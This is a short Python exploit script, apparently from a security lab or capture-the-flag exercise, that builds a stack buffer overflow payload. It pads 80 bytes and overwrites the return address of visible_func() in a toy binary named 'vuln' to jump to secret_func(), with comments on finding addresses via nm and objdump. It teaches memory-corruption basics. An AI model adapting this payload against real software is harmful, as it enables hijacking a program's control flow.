#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause
"""
Payload: overwrite the return address to jump to secret_func() (no arguments).

64-bit stack layout of visible_func():
  [rbp - 72]  buffer[64]
  [rbp -  8]  s
  [rbp]       saved RBP  (8 bytes)
  [rbp + 8]   return address  ← overwrite with &secret_func

offset_to_ret = distance from buffer[0] to the return-address slot
              = buffer_rbp_offset + 8  (8 = saved RBP size)

Find addresses:
  nm vuln | grep secret_func
  objdump -d -Mintel vuln | grep -A40 "<visible_func>:"
"""

import os
import struct

def p64(num):
    return struct.pack("<Q", num)

# ── adjust these after running nm / objdump ───────────────────────────────────
offset          = 80             # bytes from buffer[0] to return address slot
secret_func_addr = 0x0000000000401234   # replace with: nm vuln | grep " secret_func"
# ─────────────────────────────────────────────────────────────────────────────

payload  = offset * b"A"
payload += p64(secret_func_addr)

os.write(1, payload)
